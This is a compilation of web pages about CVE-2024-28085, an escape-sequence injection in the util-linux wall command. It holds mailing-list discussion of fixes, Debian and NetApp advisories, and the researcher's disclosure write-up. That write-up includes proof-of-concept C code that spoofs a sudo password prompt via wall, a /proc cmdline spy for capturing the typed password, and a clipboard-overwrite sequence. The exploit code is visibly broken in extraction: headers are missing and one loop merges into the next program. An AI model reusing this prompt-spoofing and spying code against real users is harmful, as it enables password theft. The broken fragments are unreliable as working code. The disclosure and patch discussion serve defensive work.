=== Content from www.openwall.com_84fccad8_20250110_193424.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux Â  *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper Â  *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists Â  *for password cracking*](/wordlists/)+ [passwdqc Â  *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt Â  *KDF & password hashing*](/yescrypt/)+ [yespower Â  *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish Â  *password hashing*](/crypt/)+ [phpass Â  *ditto in PHP*](/phpass/)+ [tcb Â  *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd Â  *port scan detector*](/scanlogd/)+ [popa3d Â  *tiny POP3 daemon*](/popa3d/)+ [blists Â  *web interface to mailing lists*](/blists/)+ [msulogin Â  *single user mode login*](/msulogin/)+ [php\_mt\_seed Â  *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](7) [[next>]](9) [[<thread-prev]](7) [[thread-next>]](9) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <ZgSlAmss1tT8M2vZ@itl-email>
Date: Wed, 27 Mar 2024 19:00:02 -0400
From: Demi Marie Obenour <demi@...isiblethingslab.com>
To: oss-security@...ts.openwall.com
Subject: Re: CVE-2024-28085: Escape sequence injection in
 util-linux wall

On Wed, Mar 27, 2024 at 10:30:41PM +0100, Jakub Wilk wrote:
> While looking through upstream git for a fix for thisÂ¹, I stumbled upon
> another write(1)/wall(1) control character injection vulnerability,
> introduced last year in util-linux v2.39.
>
> The offending commits are:
>
> * <https://github.com/util-linux/util-linux/commit/8a7b8456d1dc0e7c>
>   ("write: correctly handle wide characters")
> * <https://github.com/util-linux/util-linux/commit/aa13246a1bf1be9e>
>   ("wall: use fputs_careful()")
>
> The added comment says:
>
> > The locale of the recipient is nominally unknown,
> > but it's a solid bet that the encoding is compatible with the author's.
>
> Alas the bet is not that solid when writer's locale encoding is controlled
> by an attacker.
>
> We can exploit this against terminal emulators that recognize C1 control
> characters, such as Linux VTs or screen(1):
>
>    $ printf '\302\23331mMOO\302\2330m\n' | LC_ALL=kk_KZ wall
>
> I don't see any good way to fix this on the util-linux's side. It should be
> fixed on the terminal emulators' side by disabling C1 support.
>
>
> Â¹ <https://github.com/util-linux/util-linux/commit/404b0781f52f7c04>
>   ("wall: fix escape sequence Injection [CVE-2024-28085]")

Would enforcing UTF-8 validity (regardless of user locale) be a
solution?
--
Sincerely,
Demi Marie Obenour (she/her/hers)
Invisible Things Lab

Download attachment "[signature.asc](8/1)" of type "application/pgp-signature" (834 bytes)

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.openwall.com_5e77dba1_20250110_193425.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux Â  *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper Â  *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists Â  *for password cracking*](/wordlists/)+ [passwdqc Â  *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt Â  *KDF & password hashing*](/yescrypt/)+ [yespower Â  *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish Â  *password hashing*](/crypt/)+ [phpass Â  *ditto in PHP*](/phpass/)+ [tcb Â  *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd Â  *port scan detector*](/scanlogd/)+ [popa3d Â  *tiny POP3 daemon*](/popa3d/)+ [blists Â  *web interface to mailing lists*](/blists/)+ [msulogin Â  *single user mode login*](/msulogin/)+ [php\_mt\_seed Â  *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](../../../2024/03/27/9) [[next>]](2) [[<thread-prev]](../../../2024/03/27/9) [[thread-next>]](2) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <CAN_LGv21fn2e4wYEfuStomeDo7qfWXciw51J3MgsTu5J=1dHog@mail.gmail.com>
Date: Thu, 28 Mar 2024 15:36:43 +0800
From: "Alexander E. Patrakov" <patrakov@...il.com>
To: oss-security@...ts.openwall.com
Subject: Re: CVE-2024-28085: Escape sequence injection in
 util-linux wall

On Thu, Mar 28, 2024 at 7:04â€¯AM Demi Marie Obenour
<demi@...isiblethingslab.com> wrote:
>
> On Wed, Mar 27, 2024 at 10:30:41PM +0100, Jakub Wilk wrote:
> > While looking through upstream git for a fix for thisÂ¹, I stumbled upon
> > another write(1)/wall(1) control character injection vulnerability,
> > introduced last year in util-linux v2.39.
> >
> > The offending commits are:
> >
> > * <https://github.com/util-linux/util-linux/commit/8a7b8456d1dc0e7c>
> >   ("write: correctly handle wide characters")
> > * <https://github.com/util-linux/util-linux/commit/aa13246a1bf1be9e>
> >   ("wall: use fputs_careful()")
> >
> > The added comment says:
> >
> > > The locale of the recipient is nominally unknown,
> > > but it's a solid bet that the encoding is compatible with the author's.
> >
> > Alas the bet is not that solid when writer's locale encoding is controlled
> > by an attacker.
> >
> > We can exploit this against terminal emulators that recognize C1 control
> > characters, such as Linux VTs or screen(1):
> >
> >    $ printf '\302\23331mMOO\302\2330m\n' | LC_ALL=kk_KZ wall
> >
> > I don't see any good way to fix this on the util-linux's side. It should be
> > fixed on the terminal emulators' side by disabling C1 support.
> >
> >
> > Â¹ <https://github.com/util-linux/util-linux/commit/404b0781f52f7c04>
> >   ("wall: fix escape sequence Injection [CVE-2024-28085]")
>
> Would enforcing UTF-8 validity (regardless of user locale) be a
> solution?

No, as UTF-8 validation does not make sense in non-UTF-8 locales.
Enforcing ASCII for non-UTF-8 locales and UTF-8 for UTF-8 locales
would help.

--
Alexander E. Patrakov

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from lists.debian.org_f60e87c9_20250110_193426.html ===


---

[[Date Prev](msg00004.html)][[Date Next](msg00006.html)]
[[Thread Prev](msg00004.html)][[Thread Next](msg00006.html)]
[[Date Index](maillist.html#00005)]
[[Thread Index](threads.html#00005)]

# [SECURITY] [DLA 3782-1] util-linux security update

---

* *To*: debian-lts-announce@lists.debian.org
* *Subject*: [SECURITY] [DLA 3782-1] util-linux security update
* *From*: Guilhem Moulin <guilhem@debian.org>
* *Date*: Sun, 7 Apr 2024 12:40:44 +0200
* *Message-id*: <[[ðŸ”Ž]](/msgid-search/ZhJ4LNfSe0Rh2R2Z%40debian.org)Â [ZhJ4LNfSe0Rh2R2Z@debian.org](msg00005.html)>
* *Mail-followup-to*: debian-lts-announce@lists.debian.org
* *Reply-to*: debian-lts@lists.debian.org

---

```
-------------------------------------------------------------------------
Debian LTS Advisory DLA-3782-1                debian-lts@lists.debian.org
<https://www.debian.org/lts/security/>                       Guilhem Moulin
April 07, 2024                                <https://wiki.debian.org/LTS>
-------------------------------------------------------------------------

Package        : util-linux
Version        : 2.33.1-0.1+deb10u1
CVE ID         : CVE-2021-37600 CVE-2024-28085
Debian Bug     : 826596 991619 1067849

CVE-2024-28085

    Skyler Ferrante discovered that the wall(1) utility found in
    util-linux, a collection of system utilities for Linux, does not
    filter escape sequences from command line arguments.  This allows
    unprivileged local users to put arbitrary text on other users
    terminals if mesg is set to â€˜yâ€™ and the wall executable is setgid,
    which could lead to information disclosure.

    With this update the wall executable is no longer installed setgid
    tty.

CVE-2021-37600

    Kihong Heo found an integer overflow which can potentially lead to
    buffer overflow if an attacker were able to use system resources in
    a way that leads to a large number in the /proc/sysvipc/sem file.
    NOTE: this is issue is unexploitable in GNU C Library environments,
    and possibly in all realistic environments.

For Debian 10 buster, these problems have been fixed in version
2.33.1-0.1+deb10u1.

We recommend that you upgrade your util-linux packages.

For the detailed security status of util-linux please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/util-linux>

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>

```

**Attachment:
[signature.asc](pgpcc78hmJ90q.pgp)**

*Description:* PGP signature

---



=== Content from www.openwall.com_45f76138_20250110_193425.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux Â  *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper Â  *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists Â  *for password cracking*](/wordlists/)+ [passwdqc Â  *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt Â  *KDF & password hashing*](/yescrypt/)+ [yespower Â  *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish Â  *password hashing*](/crypt/)+ [phpass Â  *ditto in PHP*](/phpass/)+ [tcb Â  *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd Â  *port scan detector*](/scanlogd/)+ [popa3d Â  *tiny POP3 daemon*](/popa3d/)+ [blists Â  *web interface to mailing lists*](/blists/)+ [msulogin Â  *single user mode login*](/msulogin/)+ [php\_mt\_seed Â  *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](2) [[next>]](../../../2024/03/29/1) [[<thread-prev]](2) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20240328091027.dttlp5qscwemhris@ws.net.home>
Date: Thu, 28 Mar 2024 10:10:27 +0100
From: Karel Zak <kzak@...hat.com>
To: Solar Designer <solar@...nwall.com>
Cc: oss-security@...ts.openwall.com,
	"Skyler Ferrante (RIT Student)" <sjf5462@....edu>
Subject: Re: CVE-2024-28085: Escape sequence injection in
 util-linux wall

On Thu, Mar 28, 2024 at 12:29:35AM +0100, Solar Designer wrote:
> > >
> > > ?? <https://github.com/util-linux/util-linux/commit/404b0781f52f7c04>
> > >   ("wall: fix escape sequence Injection [CVE-2024-28085]")
> >
> > Would enforcing UTF-8 validity (regardless of user locale) be a
> > solution?
>
> Not a complete solution.

There is only one real solution: do not allow non-root users to write
to foreign file descriptors. Do not install wall(1) with suid. That's
all.

For now, it is enabled by default in the upstream tree, but I will
disable it in the next releases and explicit --enable-* will be
required. We also need to add more information to the man pages.

    Karel

I'm currently not aware of a safe way to allow
> multi-byte characters coming from concurrent writers, see:
>
> <https://www.openwall.com/lists/oss-security/2015/09/20/1>
>
> and the next message in that thread.
>
> In fact, even plain ASCII isn't entirely safe if it just happens to be
> injected into the middle of a control sequence that the target user's
> program was printing, thereby altering its effect.
>
> That said, perhaps write(1)/wall(1) just shouldn't allow bytes from both
> C0 and C1 ranges (except for TAB, LF, space) regardless of locale
> settings, at least when the programs are running SUID/SGID.  That is,
> unless the invoking user - which in this case is likely root - could
> have directly written to the target user's tty anyway.  In other words,
> mostly revert those offending commits.  Or just revert them completely.
>
> Alexander
>

--
 Karel Zak  <kzak@...hat.com>
 <http://karelzak.blogspot.com>

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from people.rit.edu_0d84e40b_20250110_193427.html ===
Wall-Escape (CVE-2024-28085)
Skyler Ferrante: Improper neutralization of escape sequences in wall
========================================================================
Summary
========================================================================
The util-linux wall command does not filter escape sequences from
command line arguments. The vulnerable code was introduced in commit
cdd3cc7fa4 (2013). Every version since has been vulnerable.
This allows unprivileged users to put arbitrary text on other users
terminals, if mesg is set to y and wall is setgid. CentOS is not
vulnerable since wall is not setgid. On Ubuntu 22.04 and Debian
Bookworm, wall is both setgid and mesg is set to y by default.
If a system runs a command when commands are not found, with the unknown
command as an argument, the unknown command will be leaked. This is
true of Ubuntu 22.04. Debian Bookworm does not leak unknown commands in
its starting configuration.
On Ubuntu 22.04, we have enough control to leak a users password by
default. The only indication of attack to the user will be an incorrect
password prompt when they correctly type their password, along with
their password being in their command history.
On other systems that allow wall messages to be sent, an attacker may
be able to alter the clipboard of a victim. This works on
windows-terminal, but not on gnome-terminal.
========================================================================
Analysis
========================================================================
When displaying inputs from stdin, wall uses the function fputs\_careful
in order to neutralize escape characters.
Unfortunately, wall does not do the same for input coming from argv.
term-utils/wall.c (note that mvec is argv)
```
/\*
\* Read message from argv[]
\*/
int i;
for (i = 0; i < mvecsz; i++) {
fputs(mvec[i], fs);
if (i < mvecsz - 1)
fputc(' ', fs);
}
fputs("\r\n", fs);
...
/\*
\* Read message from stdin.
\*/
while (getline(&lbuf, &lbuflen, stdin) >= 0)
fputs\_careful(lbuf, fs, '^', true, TERM\_WIDTH);
```
Since argv is attacker controlled, and can contain binary data, this is
exploitable. A simple PoC command:
wall $(printf "\033[33mHI")
If you are vulnerable, this should show a broadcast with "HI" being
yellow. If we instead run:
echo $(printf "\033[33mHI") | wall
This should fail with "^[[33m" showing up before our message.
To make sure the PoC will work, make sure your victim user can actually
receive messages. First check that mesg is set to y (`mesg y`). If a
user does not have mesg turned on, they are not exploitable.
If you still can't receive messages, try running `su current\_user` or
accessing the machine through SSH. Note that just because you can't
receive messages without first going through su/SSH, does not mean a
user is not vulnerable.
========================================================================
Exploitation
========================================================================
Most distros allow argument data to be seen by unprivileged users, and
some distros run commands when commands are not found. We can use this
to leak a users password by tricking them into giving their password as
a command to run.
When I run the command xsnow in my terminal, I get the following output:
```
Command 'xsnow' not found, but can be installed with:
sudo apt install xsnow
```
Lets look at what new processes are created when I do this:
```
-bash
/usr/bin/python3 /usr/lib/command-not-found -- xsnow
/usr/bin/snap advise-snap --format=json --command xsnow
```
This is on Ubuntu, but similar commands exist on other systems.
As a simple demonstration let's create a fake sudo prompt for
gnome-terminal, and then spy on /proc/$pid/cmdline.
fake sudo prompt:
```
#include
#include
int main(){
char\* argv[] = {"prog",
"\033[3A" // Move up 3
"\033[K" // Delete prompt
"[sudo] password for a\_user:"
"\033[?25l"
// Set forground RGB (48,10,36)
// hide typing
"\033[38;2;48;10;36m",
NULL};
char\* envp[] = {NULL};
execve("/usr/bin/wall", argv, envp);
}
```
cmdline spy:
```
#include
#include
#include
#include
#include
#include
#include
#include
#include
#define USLEEP\_TIME 2000
int main(){
pid\_t current\_max\_pid = 0, next\_max\_pid;
char current\_file\_name[BUFSIZ];
char buf[BUFSIZ];
DIR\* proc\_dir;
struct dirent \*dir\_e;
int curr\_e\_fp;
while(1){
proc\_dir = opendir("/proc");
if(!proc\_dir)
abort();
usleep(USLEEP\_TIME);
while((dir\_e = readdir(proc\_dir)) != NULL){
char\* d\_name = dir\_e->d\_name;
// If not a digit (not a process folder)
if(!isdigit(\*d\_name))
continue;
int num = atoi(d\_name);
if(num > current\_max\_pid){
next\_max\_pid = num;
}else{
continue;
}
snprintf(current\_file\_name, sizeof(current\_file\_name), "%s%s%s", "/proc/", d\_name, "/cmdline");
curr\_e\_fp = open(current\_file\_name, O\_RDONLY);
int ra = read(curr\_e\_fp, buf, BUFSIZ-1);
close(curr\_e\_fp);
for(int i = 0; i
#include
#include
#include
#include
#include
#include
#include
#include
#include
#define USLEEP\_TIME 3000
int main(int argc, char\*\* argv){
pid\_t current\_max\_pid = 0, next\_max\_pid;
char current\_file\_name[BUFSIZ];
char buf[BUFSIZ];
DIR\* proc\_dir;
struct dirent \*dir\_e;
int curr\_e\_fp;
if(argc != 2){
printf("Usage: prog search\_string\n");
return 1;
}
while(1){
proc\_dir = opendir("/proc");
if(!proc\_dir)
abort();
usleep(USLEEP\_TIME);
while((dir\_e = readdir(proc\_dir)) != NULL){
char\* d\_name = dir\_e->d\_name;
// If not a digit (not a process folder)
if(!isdigit(\*d\_name))
continue;
snprintf(current\_file\_name, sizeof(current\_file\_name), "%s%s%s", "/proc/", d\_name, "/cmdline");
curr\_e\_fp = open(current\_file\_name, O\_RDONLY);
int ra = read(curr\_e\_fp, buf, BUFSIZ-1);
close(curr\_e\_fp);
for(int i = 0; i
int main(){
printf("\033]52;c;QXR0YWNrZXIgbWVzc2FnZQo=\a");
}
```
Since we can send escape sequences through wall, if a user is using
a terminal that supports this escape sequence, an attacker can change
the victims clipboard to arbitrary text.
Further reference:
https://github.com/skyler-ferrante/CVE-2024-28085


=== Content from security.netapp.com_76e2aada_20250110_193427.html ===

[Skip to main content](#n-main-content)

* [NetApp.com](https://www.netapp.com/)
* [Support](https://mysupport.netapp.com)
* [Community](https://community.netapp.com)
* [Training](https://www.netapp.com/support-and-training/netapp-learning-services/)

* [Contact Us](https://www.netapp.com/company/contact-us/)

English
Ã¦Â—Â¥Ã¦ÂœÂ¬Ã¨ÂªÂž

[netapp-mark

NetApp

## Product Security](https://security.netapp.com)

Search

Search

* Search

Search

Search

* [Home](https://security.netapp.com/en)
* [Advisories](https://security.netapp.com/advisory/)
* [Bulletins](https://security.netapp.com/bulletins/)
* [Contact](https://security.netapp.com/contact/)
* [Policy](https://security.netapp.com/policy/)
* [Resources](https://security.netapp.com/resources/)
* [Certifications](https://security.netapp.com/certs/)

* [Home](https://security.netapp.com/en)
* [Advisory](https://security.netapp.com/advisory)
* [CVE-2024-28085 Util-linux Vulnerability in NetApp Products](https://security.netapp.com/advisory/ntap-20240531-0003)

## CVE-2024-28085 Util-linux Vulnerability in NetApp Products

circle-info

NetApp will continue to update this advisory as additional information becomes available.

This advisory should be considered the single source of current, up-to-date, authorized and accurate information from NetApp regarding Full Support products and versions.

close Ã—

#### Subscribe to NTAP-20240531-0003 updates

Email

Yes, please send me emails when NetApp Security Advisories are posted or updated.

 By filling and submitting this form, I understand and agree with the [NetApp privacy policy](https://www.netapp.com/company/legal/privacy-policy/ "Privacy Policy") and understand that I can unsubscribe from NetApp Security Advisory communications at any time.

Subscribe

#### Subscribe to NTAP-20240531-0003 advisory updates

OTP

Confirm

ionicons-v5-e

Confirmed your subscription to advisory alerts

close Ã—

#### Unsubscribe from NTAP-20240531-0003 advisory updates

Email

Unsubscribe

#### Unsubscribe from NTAP-20240531-0003 advisory updates

Email

Confirm

ionicons-v5-e

Unsubscribed successfully from advisory alerts

Subscribe to receive email updates

**Advisory ID:** NTAP-20240531-0003
**Version:**
3.0

**Last updated:**
06/21/2024

**Status:**
Interim.

**CVEs:** CVE-2024-28085

Overview
#### Summary

Multiple NetApp products incorporate Util-linux. Util-linux versions through 2.40 are susceptible to a vulnerability which when successfully exploited could lead to disclosure of sensitive information, addition or modification of data, or Denial of Service (DoS).

#### Impact

Successful exploitation of this vulnerability could lead to disclosure of sensitive information, addition or modification of data, or Denial of Service (DoS).

#### Vulnerability Scoring Details

| **CVE** | **Score** | **Vector** |
| --- | --- | --- |
| [CVE-2024-28085](https://nvd.nist.gov/vuln/detail/CVE-2024-28085) | 6.7 (MEDIUM) | CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H |

#### Exploitation and Public Announcements

NetApp is aware of public discussion of this vulnerability.

Affected Products
#### Affected Products

None.

#### Products Under Investigation

* ONTAP tools for VMware vSphere 10

#### Products Not Affected

* AFF BIOS - A700s
* AFF Baseboard Management Controller (BMC) - A700s
* ATTO FibreBridge - 7500N
* ATTO FibreBridge - 7600N
* Active IQ Unified Manager for Linux
* Active IQ Unified Manager for Microsoft Windows
* Active IQ Unified Manager for VMware vSphere
* Active IQ mobile app
* Astra Control Center
* Astra Control Center - NetApp Kubernetes Monitoring Operator
* Astra Control Provisioner
* Astra Trident
* Astra Trident Autosupport
* BlueXP Classification
* Brocade Fabric Operating System Firmware
* Brocade SAN Navigator (SANnav)
* Cloud Insights Acquisition Unit
* Cloud Insights Storage Workload Security Agent
* Cloud Insights Telegraf Agent
* Cloud Volumes ONTAP Mediator
* E-Series BIOS
* E-Series SANtricity OS Controller Software 11.x
* E-Series SANtricity Unified Manager and Web Services Proxy
* Element .NET SDK
* Element HealthTools
* Element JAVA SDK
* Element Plug-in for vCenter Server
* Element Powershell Tools
* Element Python SDK
* FAS/AFF BIOS - 2820
* FAS/AFF BIOS - 8300/8700/A400/C400
* FAS/AFF BIOS - A250/500f/C250
* FAS/AFF BIOS - A300/8200/A200/2650/2620/C190/A220/2720/2750/A150
* FAS/AFF BIOS - A320
* FAS/AFF BIOS - A700/9000
* FAS/AFF BIOS - A800/C800
* FAS/AFF BIOS - A900/9500
* FAS/AFF Baseboard Management Controller (BMC) - 8300/8700/A400/C400
* FAS/AFF Baseboard Management Controller (BMC) - A250/500f/C250
* FAS/AFF Baseboard Management Controller (BMC) - A320
* FAS/AFF Baseboard Management Controller (BMC) - A800/C800
* FAS/AFF Baseboard Management Controller (BMC) - A900/9500
* FAS/AFF Baseboard Management Controller (BMC) - C190/A150/A220/FAS2720/FAS2750
* FAS/AFF Baseboard Management Controller (BMC) - FAS2820
* FAS/AFF Service Processor - A300/8200/A200/2650/2620
* FAS/AFF Service Processor - A700/9000
* Global File Cache
* Host Utilities - SAN for Linux
* Host Utilities - SAN for Windows
* IOM12 SAS Disk Shelf Firmware
* IOM12B SAS Disk Shelf Firmware
* IOM12E SAS Disk Shelf Firmware
* IOM12F SAS Disk Shelf Firmware
* IOM12G SAS Disk Shelf Firmware
* IOM6 SAS Disk Shelf Firmware
* IOM6E SAS Disk Shelf Firmware
* Management Services for Element Software and NetApp HCI
* MetroCluster DataCollector
* MetroCluster Tiebreaker for clustered Data ONTAP
* Multipath I/O (SANtricity DSM for Windows MPIO)
* NetApp BlueXP
* NetApp Converged Systems Advisor Agent
* NetApp DataOps Toolkit
* NetApp E-Series Host Collection
* NetApp E-Series SANtricity Collection
* NetApp HCI Baseboard Management Controller (BMC) - H300S/H500S/H700S/H410S
* NetApp HCI Baseboard Management Controller (BMC) - H410C
* NetApp HCI Baseboard Management Controller (BMC) - H610C
* NetApp HCI Baseboard Management Controller (BMC) - H610S
* NetApp HCI Baseboard Management Controller (BMC) - H615C
* NetApp HCI Compute Node (Bootstrap OS)
* NetApp HCI Compute Node BIOS
* NetApp HCI Storage Node BIOS
* NetApp Kubernetes Monitoring Operator
* NetApp Manageability SDK
* NetApp NFS Plug-in for VMware VAAI
* NetApp ONTAP PowerShell Toolkit (PSTK)
* NetApp SolidFire & HCI Management Node
* NetApp SolidFire & HCI Storage Node (Element Software)
* NetApp SolidFire Plug-in for vRealize Orchestrator (SolidFire vRO)
* NetApp XCP NFS
* NetApp XCP SMB
* ONTAP 9 (formerly Clustered Data ONTAP)
* ONTAP Antivirus Connector
* ONTAP Mediator
* ONTAP Select Deploy administration utility
* ONTAP tools for VMware vSphere 9
* OnCommand Insight
* OnCommand Workflow Automation
* RcfFileGenerator for MetroCluster IP
* SANtricity Storage Plugin for vCenter
* SRA Plugin for Linux
* SRA Plugin for Windows
* Single Mailbox Recovery
* Snap Creator Framework
* SnapCenter
* SnapCenter Plug-in for VMware vSphere/BlueXP backup and Recovery for Virtual Machine
* SnapGathers
* SnapManager for Hyper-V
* SolidFire Storage Replication Adapter
* StorageGRID (formerly StorageGRID Webscale)
* StorageGRID BIOS SG1000/SG100/SG1100/SG110
* StorageGRID BIOS SG5660/SG5612/SG5760/SG5712
* StorageGRID BIOS SG5812/SG5860
* StorageGRID BIOS SG6060/SGF6024/SGF6112/SG6160
* StorageGRID Baseboard Management Controller (BMC) - SG6060/SG6160/SGF6024/SGF6112/SG100/SG110/SG1000/SG1100
* StorageGRID Baseboard Management Controller (BMC) SG5812/SG5860
* System Manager 9.x
* Terraform Provider for ONTAP

Remediation
#### Software Versions and Fixes

None.

This section will be updated as patches are released.

#### Workarounds

None at this time.

#### Obtaining Software Fixes

Software fixes will be made available through the NetApp Support website in the Software Download section.

<https://mysupport.netapp.com/site/downloads/>

Customers who do not have access to the Support website should contact Technical Support at the number below to obtain the patches.

#### Contact Information

Check <http://mysupport.netapp.com> for further
updates.

**Technical Support**

mysupport.netapp.com

1 888 4 NETAPP (1 888 463 8277) (U.S. and Canada)

+00 800 44 638277 (EMEA/Europe)

+800 800 80 800 (Asia/Pacific)

Revision History
#### Status of This Notice

**Interim.**

NetApp will continue to update this advisory as additional information becomes available.

This advisory should be considered the single source of current, up-to-date, authorized and accurate information from NetApp regarding Full Support products and versions.

This advisory is posted at the following link:

<https://security.netapp.com/advisory/NTAP-20240531-0003>
#### Revision History

| **Revision #** | **Date** | **Comments** |
| --- | --- | --- |
| 1.0 | 20240531 | Initial Public Release |
| 2.0 | 20240603 | ONTAP Select Deploy administration utility and SnapCenter Plug-in for VMware vSphere/BlueXP backup and Recovery for Virtual Machine moved to Products Not Affected |
| 3.0 | 20240621 | ONTAP tools for VMware vSphere 9 and FAS/AFF Baseboard Management Controller (BMC) - A900/9500 moved to Products Not Affected |

This document is provided solely for informational purposes. All information is based upon NetAppÃ¢Â€Â™s current knowledge and understanding of the hardware and software products tested by NetApp, and the methodology and assumptions used by NetApp. NetApp is not responsible for any errors or omissions that may be contained herein, and no warranty, representation, or other legal commitment or obligation is being provided by NetApp. Ã‚Â© 2025 NetApp, Inc. All rights reserved. No portions of this document may be reproduced without prior written consent of NetApp, Inc.

 Â©  NetApp

Have feedback for our website?
[Let us know](https://www.netapp.com/forms/site-feedback/)



=== Content from www.openwall.com_4374db4c_20250110_193427.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux Â  *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper Â  *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists Â  *for password cracking*](/wordlists/)+ [passwdqc Â  *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt Â  *KDF & password hashing*](/yescrypt/)+ [yespower Â  *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish Â  *password hashing*](/crypt/)+ [phpass Â  *ditto in PHP*](/phpass/)+ [tcb Â  *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd Â  *port scan detector*](/scanlogd/)+ [popa3d Â  *tiny POP3 daemon*](/popa3d/)+ [blists Â  *web interface to mailing lists*](/blists/)+ [msulogin Â  *single user mode login*](/msulogin/)+ [php\_mt\_seed Â  *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories 